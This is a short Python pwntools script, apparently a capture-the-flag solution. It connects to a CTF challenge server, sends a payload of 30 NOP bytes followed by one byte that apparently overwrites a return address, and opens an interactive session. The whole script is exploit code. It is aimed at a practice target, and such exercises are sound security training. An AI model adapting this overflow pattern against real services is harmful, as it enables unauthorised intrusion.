from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3007)

payload = ''
payload += '\x90'*30
payload += '\xd8'

p.sendline(payload)
p.interactive()
